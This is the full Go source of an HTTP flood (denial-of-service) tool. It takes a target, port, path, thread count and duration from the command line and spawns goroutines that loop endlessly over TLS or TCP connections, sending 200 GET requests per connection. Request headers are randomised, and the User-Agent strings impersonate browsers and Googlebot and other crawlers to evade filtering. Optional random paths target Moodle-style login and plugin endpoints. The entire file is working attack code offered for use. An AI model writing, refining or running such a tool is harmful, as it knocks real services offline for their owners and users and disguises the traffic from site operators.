package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

var (
	ip        = "test.com"
	s_port    = "443"
	port      = 443
	threads   = 0
	path      = "/"
	timer     = 0
	rpath     = false
	a_z       = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	}
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
)

func init() {
	rand.New(rand.NewSource(time.Now().UnixNano()))
}

func getuseragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func getheader() string {
	if rpath == true {
		// RANDOM PATH OR CREATE MULTIPLE PATH
		var roption = []string{
			fmt.Sprintf("/?=%s%s%s%s%s.php", a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))]),
			fmt.Sprintf("/?=%s%s%s%s%s", a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))]),
			fmt.Sprintf("/login/index.php?=%s%s%s%s%s", a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))], a_z[rand.Intn(len(a_z))]),
			"/index.php",
			"/login/index.php",
			"/admin/tool/mobile/mobile.webmanifest.php",
			"/pluginfile.php",
			"/",
		}
		path = roption[rand.Intn(len(roption))]
	}
	get_host := fmt.Sprintf("GET %s HTTP/1.1\r\nHost:%s:%d\r\n", path, ip, port)
	connection := "Connection: keep-alive\r\n"
	accept := acceptall[rand.Intn(len(acceptall))]
	referer := "Referer: " + "https://" + ip + "/" + "\r\n"
	useragent := "User-Agent: " + getuseragent() + "\r\n"
	return get_host + useragent + connection + accept + referer + "\r\n"
}

func attack() {
	var err error
	for {
		if port == 443 {
			var x net.Conn
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         ip, //simple fix
			}
			x, err = tls.Dial("tcp", fmt.Sprintf("%s:%d", ip, port), cfg)
			if err != nil {
				fmt.Println("Connection Down!!!")
			} else {
				for i := 0; i < 200; i++ {
					x.Write([]byte(getheader()))
				}
				x.Close()
			}
		} else {
			var s net.Conn
			s, err = net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
			if err != nil {
				fmt.Println("Connection Down!!!")
			} else {
				for i := 0; i < 200; i++ {
					s.Write([]byte(getheader()))
				}
				s.Close()
			}
		}
	}
}

func main() {
	ip = os.Args[1]
	s_port := os.Args[2]
	cport, err := strconv.Atoi(s_port)
	if err != nil {
		fmt.Println("Convertion Error!")
	}
	port = cport
	path = os.Args[3]
	if path == "t" {
		rpath = true
	}
	if path == "T" {
		rpath = true
	}
	s_threads := os.Args[4]
	cthreads, err := strconv.Atoi(s_threads)
	if err != nil {
		fmt.Println("Convertion Error!")
	}
	threads = cthreads
	s_timer := os.Args[5]
	ctimer, err := strconv.Atoi(s_timer)
	if err != nil {
		fmt.Println("Convertion Error!")
	}
	timer = ctimer
	fmt.Println("ATTACK STARTED WITH " + s_threads + "THREADS")
	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go attack()
	}
	time.Sleep(time.Duration(timer) * time.Second)
}
